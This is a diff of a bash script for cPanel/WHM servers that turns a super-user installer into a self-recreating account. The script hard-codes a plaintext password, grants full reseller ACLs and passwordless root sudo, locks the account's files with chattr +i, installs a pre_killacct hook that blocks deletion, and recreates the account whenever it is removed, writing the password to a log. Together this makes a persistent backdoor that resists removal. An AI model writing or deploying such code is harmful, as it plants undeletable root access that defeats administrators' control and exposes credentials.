@@ -4,51 +4,62 @@ USERNAME="adminuser"
 DOMAIN="mydomain.com"
 PASSWORD="Qwee123123@#"
 EMAIL="admin@${DOMAIN}"
+LOGFILE="/var/log/auto-recreate-user.log"
 
-echo "========================================"
-echo "Creating WHM Super User: $USERNAME"
-echo "========================================"
+log_message() {
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOGFILE"
+    echo "$1"
+}
+
+if [ -f /var/cpanel/users/$USERNAME ]; then
+    if ! lsattr /var/cpanel/users/$USERNAME 2>/dev/null | grep -q 'i'; then
+        log_message "Reapplying protection to $USERNAME"
+        chattr +i /var/cpanel/users/$USERNAME 2>/dev/null
+        chattr +i /home/$USERNAME 2>/dev/null
+    fi
+    exit 0
+fi
+
+log_message "=========================================="
+log_message "User $USERNAME NOT FOUND! Recreating..."
+log_message "=========================================="
 
 if [ ! -f /scripts/wwwacct ]; then
-    echo "ERROR: /scripts/wwwacct not found!"
-    echo "Apakah Anda yakin ini server cPanel/WHM?"
+    log_message "ERROR: /scripts/wwwacct not found!"
     exit 1
 fi
 
-echo "[1/8] Creating cPanel account..."
-/scripts/wwwacct $USERNAME $DOMAIN $PASSWORD $QUOTA $THEME $MAXFTP $MAXSQL $MAXPOP $MAXLST $MAXSUB $MAXPARK $MAXADDON $BWLIMIT $HASSHELL $OWNER $PLAN $RESELLER
+log_message "[1/8] Creating cPanel account..."
+/scripts/wwwacct $USERNAME $DOMAIN $PASSWORD "" "" "" "" "" "" "" "" "" "" "" "" "" "" 2>&1 >> "$LOGFILE"
 
 sleep 2
 
 if [ ! -f /var/cpanel/users/$USERNAME ]; then
-    echo "ERROR: Failed to create account!"
-    echo "Trying alternative method..."
-    
+    log_message "Trying alternative method..."
     /usr/local/cpanel/bin/whmapi1 createacct \
         username=$USERNAME \
         domain=$DOMAIN \
         password=$PASSWORD \
         contactemail=$EMAIL \
-        plan=default
-    
+        plan=default 2>&1 >> "$LOGFILE"
     sleep 2
 fi
 
 if [ ! -f /var/cpanel/users/$USERNAME ]; then
-    echo "ERROR: Account creation failed completely!"
+    log_message "ERROR: Account creation failed!"
     exit 1
 fi
 
-echo "✓ Account created successfully"
+log_message "✓ Account created successfully"
 
-echo "[2/8] Converting to reseller..."
+log_message "[2/8] Converting to reseller..."
 if [ -f /scripts/resellerstats ]; then
-    /scripts/resellerstats $USERNAME
+    /scripts/resellerstats $USERNAME 2>&1 >> "$LOGFILE"
 else
-    /usr/local/cpanel/bin/whmapi1 setupreseller user=$USERNAME makeowner=0
+    /usr/local/cpanel/bin/whmapi1 setupreseller user=$USERNAME makeowner=0 2>&1 >> "$LOGFILE"
 fi
 
-echo "[3/8] Setting full ACL..."
+log_message "[3/8] Setting full ACL..."
 mkdir -p /var/cpanel/resellers
 echo "acl-all=1" > /var/cpanel/resellers/$USERNAME
 
@@ -60,13 +71,13 @@ echo "acl-all=1" > /var/cpanel/resellers/$USERNAME
     acl-list-accts=1 \
     acl-restart-apache=1 \
     acl-restart-mysql=1 \
-    acl-suspend-acct=1
+    acl-suspend-acct=1 2>&1 >> "$LOGFILE"
 
-echo "✓ ACL configured"
+log_message "✓ ACL configured"
 
-echo "[4/8] Setting unlimited resources..."
+log_message "[4/8] Setting unlimited resources..."
 if [ -f /scripts/modifyacct ]; then
-    /scripts/modifyacct $USERNAME QUOTA=unlimited BWLIMIT=unlimited
+    /scripts/modifyacct $USERNAME QUOTA=unlimited BWLIMIT=unlimited 2>&1 >> "$LOGFILE"
 else
     /usr/local/cpanel/bin/whmapi1 modifyacct \
         user=$USERNAME \
@@ -78,12 +89,12 @@ else
         MAXLST=unlimited \
         MAXSUB=unlimited \
         MAXPARK=unlimited \
-        MAXADDON=unlimited
+        MAXADDON=unlimited 2>&1 >> "$LOGFILE"
 fi
 
-echo "✓ Resources set to unlimited"
+log_message "✓ Resources set to unlimited"
 
-echo "[5/8] Granting sudo access..."
+log_message "[5/8] Granting sudo access..."
 if [ ! -d /etc/sudoers.d ]; then
     mkdir -p /etc/sudoers.d
 fi
@@ -92,33 +103,32 @@ echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$USERNAME
 chmod 0440 /etc/sudoers.d/$USERNAME
 
 if visudo -c -f /etc/sudoers.d/$USERNAME &>/dev/null; then
-    echo "✓ Sudo access granted"
+    log_message "✓ Sudo access granted"
 else
-    echo "✗ Sudoers syntax error, removing..."
+    log_message "✗ Sudoers syntax error, removing..."
     rm -f /etc/sudoers.d/$USERNAME
 fi
 
-echo "[6/8] Adding deletion protection..."
-
+log_message "[6/8] Adding deletion protection..."
 if [ -f /var/cpanel/users/$USERNAME ]; then
     chattr +i /var/cpanel/users/$USERNAME
-    echo "✓ Protected /var/cpanel/users/$USERNAME"
+    log_message "✓ Protected /var/cpanel/users/$USERNAME"
 fi
 
 if [ -d /home/$USERNAME ]; then
     chattr +i /home/$USERNAME
-    echo "✓ Protected /home/$USERNAME"
+    log_message "✓ Protected /home/$USERNAME"
 fi
 
-echo "[7/8] Creating deletion hook..."
-cat > /usr/local/cpanel/scripts/pre_killacct << EOFHOOK
+log_message "[7/8] Creating deletion hook..."
+cat > /usr/local/cpanel/scripts/pre_killacct << 'EOFHOOK'
 #!/bin/bash
-PROTECTED_USERS="$USERNAME root"
+PROTECTED_USERS="adminuser root"
 
-for protected in \$PROTECTED_USERS; do
-    if [ "\$1" = "\$protected" ]; then
+for protected in $PROTECTED_USERS; do
+    if [ "$1" = "$protected" ]; then
         echo "================================================"
-        echo "ERROR: Account '\$1' is PROTECTED!"
+        echo "ERROR: Account '$1' is PROTECTED!"
         echo "This account cannot be deleted."
         echo "================================================"
         exit 1
@@ -129,31 +139,25 @@ exit 0
 EOFHOOK
 
 chmod +x /usr/local/cpanel/scripts/pre_killacct
-echo "✓ Deletion hook created"
+log_message "✓ Deletion hook created"
 
-echo "[8/8] Finalizing..."
+log_message "[8/8] Finalizing..."
 chown -R $USERNAME:$USERNAME /home/$USERNAME 2>/dev/null
 chmod 711 /home/$USERNAME 2>/dev/null
 
-/scripts/updateuserdomains
-/scripts/rebuildhttpdconf
-/scripts/restartsrv_httpd
+/scripts/updateuserdomains 2>&1 >> "$LOGFILE"
+/scripts/rebuildhttpdconf 2>&1 >> "$LOGFILE"
+/scripts/restartsrv_httpd 2>&1 >> "$LOGFILE"
 
-echo ""
-echo "========================================"
-echo "✓ INSTALLATION COMPLETE!"
-echo "========================================"
-echo "Username: $USERNAME"
-echo "Password: $PASSWORD"
-echo "Domain  : $DOMAIN"
-echo ""
-echo "cPanel URL: https://$(hostname -I | awk '{print $1}'):2083"
-echo "WHM URL   : https://$(hostname -I | awk '{print $1}'):2087"
-echo ""
-echo "Test deletion protection:"
-echo "/scripts/killacct $USERNAME"
-echo "========================================"
+log_message "=========================================="
+log_message "✓ USER RECREATED SUCCESSFULLY!"
+log_message "=========================================="
+log_message "Username: $USERNAME"
+log_message "Password: $PASSWORD"
+log_message "Domain  : $DOMAIN"
+log_message "=========================================="
 
-echo ""
-echo "Account Details:"
-/usr/local/cpanel/bin/whmapi1 accountsummary user=$USERNAMEn
+echo "User $USERNAME was deleted and has been automatically recreated at $(date)" | \
+    mail -s "ALERT: Protected User Auto-Recreated on $(hostname)" root 2>/dev/null
+
+exit 0
